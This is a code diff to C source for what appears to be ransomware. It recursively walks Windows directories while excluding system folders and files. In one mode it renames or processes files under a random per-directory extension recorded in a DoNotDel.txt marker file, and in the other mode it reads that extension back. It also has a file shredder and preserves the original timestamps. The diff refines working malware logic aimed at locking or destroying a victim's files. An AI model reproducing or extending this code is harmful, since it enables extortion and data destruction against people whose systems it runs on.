@@ -33,7 +33,7 @@ const char* exts9 = ",litcoffee,";
 const char* exts10 = ",properties,"; */
 
 const char* exdir = ",\\Intel,\\ProgramData,\\Program Files,\\Program Files (x86),\\AppData\\Local\\Temp,\\Local Settings\\Temp,\\Windows,Temporary Internet Files,Content.IE5,Documents and Settings,PerfLogs,";
-const char* exfile = ",desktop.ini,ntuser.ini,NTUSER.DAT,";
+const char* exfile = ",desktop.ini,ntuser.ini,NTUSER.DAT,donotdel.me";
 
 void toLower(char* str)
 {
@@ -82,6 +82,18 @@ const char* get_file_ext(const char* fname)
 	return dot + 1;
 }
 
+int randInRange(int min, int max)
+{
+	double scale = 1.0 / (RAND_MAX + 1);
+	double range = max - min + 1;
+	return min + (int) ( rand() * scale * range );
+}
+
+char randomByte()
+{
+	return (char)randInRange(0, 255);
+}
+
 char* generateRandomString(int size)
 {
 	int i;
@@ -90,6 +102,7 @@ char* generateRandomString(int size)
     for(i = 0; i < size; i++)
 	{
 		res[i] = (char) (rand()%(ASCII_END-ASCII_START))+ASCII_START;
+		//res[i] = (char)randInRange(ASCII_START, ASCII_END);
     }
     res[i] = '\0';
     return res;
@@ -101,18 +114,6 @@ void copy_old_time(struct stat* st, const char* path_new)
 	newTimeBuf.actime  = st->st_atime;
 	newTimeBuf.modtime = st->st_mtime;
 	utime(path_new, &newTimeBuf);
-}
-
-int randInRange(int min, int max)
-{
-	double scale = 1.0 / (RAND_MAX + 1);
-	double range = max - min + 1;
-	return min + (int) ( rand() * scale * range );
-}
-
-char randomByte()
-{
-	return (char)randInRange(0, 255);
 }
 
 void shredder(struct stat* st, const char* path)
@@ -287,7 +288,40 @@ void processFilesRecursively(threadpool *tp, int mode, int key, const char* base
 	
     // Unable to open directory stream
     if (!dir)
+	{
         return;
+	}
+	
+	char path_dontdel[PATH_SIZE];
+	strcpy(path_dontdel, basePath);
+	strcat(path_dontdel, "\\");
+	strcat(path_dontdel, "DoNotDel.txt");
+	char file_ext[FILEEXT_SIZE];
+	int skip_file=0;
+	
+	if (mode==1)
+	{
+		char* fname = generateRandomString(randInRange(4, 15));
+		strcpy(file_ext, fname);
+		free(fname);
+	}
+	else if (mode==2)
+	{
+		if (file_exists(path_dontdel))
+		{
+			FILE* dontdel;
+			dontdel = fopen(path_dontdel, "r");
+			if (dontdel != NULL)
+			{
+				fscanf(dontdel, "%[^\n]", file_ext);
+			}
+			fclose(dontdel);
+		}
+		else
+		{
+			skip_file=1;
+		}
+	}
 	
     while ((dp = readdir(dir)) != NULL)
     {
@@ -312,6 +346,8 @@ void processFilesRecursively(threadpool *tp, int mode, int key, const char* base
 				//printf("%s\n", dp->d_name);
 				//printf("path_old : %s\n", path_old);
 				
+				if (skip_file==1) continue;
+				
 				char* exclude = strstr(exfile, dp->d_name);
 				if (exclude)
 				{
@@ -319,7 +355,7 @@ void processFilesRecursively(threadpool *tp, int mode, int key, const char* base
 				}
 				
 				// Check Path contains extension
-				char* ret = strstr(path_old, ext);
+				char* ret = strstr(path_old, file_ext);
 				if (mode==1 && ret)
 				{
 					continue;
@@ -398,7 +434,7 @@ void processFilesRecursively(threadpool *tp, int mode, int key, const char* base
 				PathInfo *pi = (PathInfo *)malloc(sizeof(PathInfo));
 				strcpy(pi->basePath, basePath);
 				strcpy(pi->name, dp->d_name);
-				strcpy(pi->ext, ext);
+				strcpy(pi->ext, file_ext);
 				pi->mode = mode;
 				pi->key = key;
 				pi->num = count;
@@ -409,29 +445,25 @@ void processFilesRecursively(threadpool *tp, int mode, int key, const char* base
 
     closedir(dir);
 	
-	strcpy(path_old, basePath);
-	strcat(path_old, "\\");
-	strcat(path_old, ext);
-	strcat(path_old, ".txt");
 	if (mode==1)
 	{
-		if (file_exists(path_old))
+		if (file_exists(path_dontdel))
 		{
-			file_remove(path_old);
+			file_remove(path_dontdel);
 		}
-		FILE* readme;
-		readme = fopen(path_old, "a+");
-		if (readme != NULL)
+		FILE* dontdel;
+		dontdel = fopen(path_dontdel, "a+");
+		if (dontdel != NULL)
 		{
-			fprintf(readme, "%s\n", "HelloWorld!");
+			fprintf(dontdel, "%s\n", file_ext);
 		}
-		fclose(readme);
+		fclose(dontdel);
 	}
 	else if (mode==2)
 	{
-		if (file_exists(path_old))
+		if (file_exists(path_dontdel))
 		{
-			file_remove(path_old);
+			file_remove(path_dontdel);
 		}
 	}
 }
